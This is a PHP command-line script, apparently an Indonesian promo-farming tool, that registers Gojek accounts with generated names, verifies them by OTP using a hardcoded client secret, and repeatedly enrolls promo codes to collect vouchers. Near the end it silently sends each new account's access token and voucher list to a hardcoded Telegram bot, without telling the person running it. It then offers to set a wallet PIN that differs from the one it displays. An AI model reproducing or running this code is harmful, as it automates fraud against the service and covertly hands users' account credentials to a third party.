<?php
date_default_timezone_set('Asia/Jakarta');
include "function1.php";
echo
"\e[32;1m*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*\n";
echo
"\e[32;1m*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*\n";
echo "\e[37;1m*************** \e[93mSEMOGA ORA ZONK\e[37;1m ***************   \n";
echo "\e[37;1m****************** \e[93mBISMILLAH\e[37;1m ******************\n";
echo "\e[37;1m******************* \e[93mCAK GONDOL\e[37;1m *******************\n";
echo "\e[37;1m*************** \e[93minstagram : @sixiez\e[37;1m *************\n";
echo "\e[37;1m********** \e[93mOJO SAMPEK BUSUK TUHAAAAN\e[37;1m ************\n";
echo "\e[32;1m*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*\n";
echo "\e[31;1m    || >>>>>>>>\e[1;33m".date('[d-m-Y] [H:i:s]')."\e[31;1m<<<<<<<< ||\n";
echo "\e[32;1m*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*\n";
echo "\e[32;1m*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*\n";
echo "\e[31;1m*•*•*•*•*•*•*•*•*•*•\e[93mBRUTCORP\e[31;1m•*•*•*•*•*•*•*•*•*•*\n";
echo "\e[32;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
echo "\e[31;1m Sudah Punya User Id (Y/N ?: ";	
$pilihy = trim(fgets(STDIN));
if($pilihy == "y" || $pilihy == "sudah")

echo "\e[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
	goto login;
login:
echo "\e[1;33m*~*~*~*~*~*~\e[32;1m tekan enter\e[1;33m*~*~*~*~*~*~\n";
$pass =  ( '║ User Login : ' );
echo "\033[30;40m";
$user = trim(fgets(STDIN));
echo "\033[0m";
if($user == "")
{
	echo "\e[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
	echo "\e[1;32m Maneh  ";
	$input = trim(fgets(STDIN));
	echo "\e[32;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
		goto ulang;
}
else
{
		echo "\e[32;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";	
		echo "\e[91m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
		echo "\e[96m[🚫]        \e[91m.    HADEEEH         \e[96m [🚫]\n";
	        echo "\e[96m[🚫]       \e[91m IKUTIN YANG DI SURUH SIH       \e[96m [🚫]\n";
		echo "\e[96m[🚫]           \e[91mMASIH AJA NGEYEL LU      \e[96m [🚫]\n";
	        echo "\e[96m[🚫] \e[91mBELOM PERNAH DICIPOK KUFRA YA LO \e[96m [🚫]\n";
		echo "\e[91m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
goto login;
}
	return rtrim( $input, "\n" );
ulang:
echo "\n";
echo "\e[1;37m LOOSS GAK REWEL BLASS  \n";
echo "\e[32;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\e[31;1m ( SIDOARJO$input)\e[32;1m ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
// function change(){
        $nama = nama();
        $email = str_replace(" ", "", $nama) . mt_rand(100, 999);
        echo color("green","📲▶️ Nomor : ");
        // $no = trim(fgets(STDIN));
        $nohp = trim(fgets(STDIN));
        $nohp = str_replace("62","62",$nohp);
        $nohp = str_replace("(","",$nohp);
        $nohp = str_replace(")","",$nohp);
        $nohp = str_replace("-","",$nohp);
        $nohp = str_replace(" ","",$nohp);

        if (!preg_match('/[^+0-9]/', trim($nohp))) {
            if (substr(trim($nohp),0,3)=='62') {
                $hp = trim($nohp);
            }
            else if (substr(trim($nohp),0,1)=='0') {
                $hp = '62'.substr(trim($nohp),1);
        }
         elseif(substr(trim($nohp), 0, 2)=='62'){
            $hp = '6'.substr(trim($nohp), 1);
        }
        else{
            $hp = '1'.substr(trim($nohp),0,13);
        }
    }
        $data = '{"email":"'.$email.'@gmail.com","name":"'.$nama.'","phone":"+'.$hp.'","signed_up_country":"ID"}';
        $register = request("/v5/customers", null, $data);
        if(strpos($register, '"otp_token"')){
        $otptoken = getStr('"otp_token":"','"',$register);
        echo color("white","📶▶️ KODE OTP DIKIRIM ")."\n";
        otp:
        echo color("green","💬▶️ OTP 4 digit jgn lebih/kurang : ");
        $otp = trim(fgets(STDIN));
        $data1 = '{"client_name":"gojek:cons:android","data":{"otp":"' . $otp . '","otp_token":"' . $otptoken . '"},"client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e"}';
        $verif = request("/v5/customers/phone/verify", null, $data1);
        if(strpos($verif, '"access_token"')){
        echo color("Purple","✔️ SUCCESS \n");
        $token = getStr('"access_token":"','"',$verif);
        $uuid = getStr('"resource_owner_id":',',',$verif);
        echo color("white","+] Tokenku : ".$token."\n\n");
        save("token.txt",$token);
        echo color("red","\n▬▬▬▬▬▬▬▬▬▬▬▬* WANI PERIH *▬▬▬▬▬▬▬▬▬▬▬▬");
     echo "\n".color("blue","⏩ 1️⃣");
        echo "\n".color("white","🔎 TIK.TOK..TIK...TOK");
        for($a=1;$a<=3;$a++){
        echo color("purple",".");
        sleep(30);
        }
       $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"PESANGOFOOD2107"}');
        $message = fetch_value($code1,'"message":"','"');
        if(strpos($code1, 'Promo kamu sudah bisa dipakai.')){
        echo "\n".color("green","🔓▶️ Message: ".$message);
        goto gofood;
        }else{
        echo "\n".color("red","🔐▶️ Message: ".$message);
	      gofood:
        echo "\n".color("blue","⏩ 2️⃣");
        echo "\n".color("white","🔎 TIK.TOK..TIK...TOK ");
        for($a=1;$a<=3;$a++){
        echo color("purple",".");
        sleep(15);
        }
       $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"PESANGOFOOD2107"}');
        $message = fetch_value($code1,'"message":"','"');
        if(strpos($code1, 'Promo kamu sudah bisa dipakai.')){
        echo "\n".color("green","🔓▶️ Message: ".$message);
        goto gofood;
        }else{
        echo "\n".color("red","🔐▶️ Message: ".$message);
	      gocar:
        echo "\n".color("blue","⏩ 3️⃣");
        echo "\n".color("white","🔎 TIK.TOK..TIK...TOK.");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(10);
        }
        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"GOJEKAMAN"}');
        $message = fetch_value($code1,'"message":"','"');
        echo "\n".color("white","🔓▶️ Message: ".$message);
        echo "\n".color("blue","⏩ 4️⃣");
        echo "\n".color("white","🔎TIK.TOK..TIK...TOK");
        for($a=1;$a<=3;$a++){
        echo color("white",".");
        sleep(5);
        }
        sleep(10);
        $boba09 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"PAKEAMAN"}');
        $messageboba09 = fetch_value($boba09,'"message":"','"');
        echo "\n".color("blue","# Message: ".$messageboba09);
        sleep(3);
        $cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=13&page=1', $token);
        $total = fetch_value($cekvoucher,'"total_vouchers":',',');
        $voucher1 = getStr1('"title":"','",',$cekvoucher,"1");
        $voucher2 = getStr1('"title":"','",',$cekvoucher,"2");
        $voucher3 = getStr1('"title":"','",',$cekvoucher,"3");
        $voucher4 = getStr1('"title":"','",',$cekvoucher,"4");
        $voucher5 = getStr1('"title":"','",',$cekvoucher,"5");
        $voucher6 = getStr1('"title":"','",',$cekvoucher,"6");
        $voucher7 = getStr1('"title":"','",',$cekvoucher,"7");
        $voucher8 = getStr1('"title":"','",',$cekvoucher,"8");
        $voucher9 = getStr1('"title":"','",',$cekvoucher,"9");
        $voucher10 = getStr1('"title":"','",',$cekvoucher,"10");
        $voucher11 = getStr1('"title":"','",',$cekvoucher,"11");
        $voucher12 = getStr1('"title":"','",',$cekvoucher,"12");
        $voucher13 = getStr1('"title":"','",',$cekvoucher,"13");
        echo "\n".color("white","🎫▶️ HASILE TOPO ".$total." : ");
        echo "\n".color("green","         Jurus ke 1. ".$voucher1);
        echo "\n".color("green","         Jurus ke 2. ".$voucher2);
        echo "\n".color("green","         Jurus ke 3. ".$voucher3);
        echo "\n".color("green","         Jurus ke 4. ".$voucher4);
        echo "\n".color("green","         Jurus ke 5. ".$voucher5);
        echo "\n".color("green","         Jurus ke 6. ".$voucher6);
        echo "\n".color("green","         Jurus ke 7. ".$voucher7);
        echo "\n".color("green","         Jurus ke 8. ".$voucher8);
        echo "\n".color("green","         Jurus ke 9. ".$voucher9);
        echo "\n".color("green","         Jurus ke 10. ".$voucher10);
      	echo "\n".color("green","         Jurus ke 11. ".$voucher11);
        echo "\n".color("green","         Jurus ke 12. ".$voucher12);
        echo "\n".color("green","         Jurus ke 13. ".$voucher13);
        echo"\n";
        $expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
        $expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
        $expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'3');
        $expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'4');
        $expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
        $expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
        $expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
        $expired8 = getStr1('"expiry_date":"','"',$cekvoucher,'8');
        $expired9 = getStr1('"expiry_date":"','"',$cekvoucher,'9');
        $expired10 = getStr1('"expiry_date":"','"',$cekvoucher,'10');
        $expired11 = getStr1('"expiry_date":"','"',$cekvoucher,'11');
        $expired12 = getStr1('"expiry_date":"','"',$cekvoucher,'12');
        $expired13 = getStr1('"expiry_date":"','"',$cekvoucher,'13');
        $TOKEN  = "0000000000:7V93cvCvw1DNuTk0Hp1ZFywJGmjiP7aQ";
      	$chatid = "";
      	$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]\n[+] ".$voucher8."\n[+] Exp : [".$expired8."]\n[+] ".$voucher9."\n[+] Exp : [".$expired9."]\n[+] ".$voucher10."\n[+] Exp : [".$expired10."] ".$voucher11."\n[+] Exp : [".$expired11."]\n[+] ".$voucher12."\n[+] Exp : [".$expired12."]\n[+] ".$voucher13."\n[+] Exp : [".$expired13."]\n[+]";
      	$method	= "sendMessage";
      	$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
      	$post = [
      		'chat_id' => $chatid,
                'text' => $pesan
        	];
                $header = [
                "X-Requested-With: XMLHttpRequest",
                "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" 
                        ];
                                        $ch = curl_init();
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        curl_setopt($ch, CURLOPT_URL, $url);
                                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $post );   
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                                        $datas = curl_exec($ch);
                                        $error = curl_error($ch);
                                        $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                                        curl_close($ch);
                                        $debug['text'] = $pesan;
                                        $debug['respon'] = json_decode($datas, true);
         setpin:
         echo "\n".color("white","🔧▶️ SET PIN GOPAY SEKALIAN ? !!!: Y/N ");
         $pilih1 = trim(fgets(STDIN));
         if($pilih1 == "y" || $pilih1 == "Y"){
         //if($pilih1 == "y" && strpos($no, "628")){
         echo color("Blue","▬▬▬▬▬▬▬▬▬▬▬▬▬▬🔧 PINKU = 898988 🔧▬▬▬▬▬▬▬▬▬▬▬▬")."\n";
         $data2 = '{"pin":"898989"}';
         $getotpsetpin = request("/wallet/pin", $token, $data2, null, null, $uuid);
         echo "OTP PIN 6 digit : ";
         $otpsetpin = trim(fgets(STDIN));
         $verifotpsetpin = request("/wallet/pin", $token, $data2, null, $otpsetpin, $uuid);
         echo $verifotpsetpin;
         }else if($pilih1 == "n" || $pilih1 == "N"){
         die();
         }else{
         echo color("red","-] GAGAL!!!\n");
         }
         }
         }
         }else{
         echo color("red","-] OTP SALAH ");
         echo"\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n";
         echo color("purple","!] MASUKIN NOMER ULANG\n");
         goto ulang;
         }
         }else{
         echo color("red","-] Nomor udah kena colok.");
         echo"\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n";
         echo color("red","!] Coba Nomer yang perawan \n");
         goto ulang;
         }
//  }

// echo change()."\n";
